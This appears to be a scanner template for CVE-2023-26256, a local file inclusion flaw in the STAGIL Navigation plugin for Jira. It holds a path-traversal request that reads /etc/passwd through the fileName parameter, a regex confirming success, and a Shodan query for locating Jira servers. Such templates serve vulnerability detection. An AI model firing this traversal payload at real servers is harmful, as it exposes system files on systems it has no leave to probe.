id: CVE-2023-26256

info:
  name: STAGIL Navigation for Jira Menu & Themes <2.0.52 - Local File Inclusion
  author: pikpikcu
  severity: high
  verified: false
  description: |
    STAGIL Navigation for Jira Menu & Themes plugin before 2.0.52 is susceptible to local file inclusion via modifying the fileName parameter to the snjFooterNavigationConfig endpoint. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can potentially allow the attacker to steal cookie-based authentication credentials and launch other attacks.
    shodan-query: title:Jira
  reference:
    - https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26256.md
    - https://marketplace.atlassian.com/apps/1216090/stagil-navigation-for-jira-menus-themes?tab=overview&hosting=cloud
    - https://nvd.nist.gov/vuln/detail/CVE-2023-26256

  rules:
    r0:
      request:
        method: GET
        path: /plugins/servlet/snjFooterNavigationConfig?fileName=../../../../etc/passwd&fileMime=$textMime
      expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body) && response.raw_header.bcontains(b'$textMime')
  expression: r0()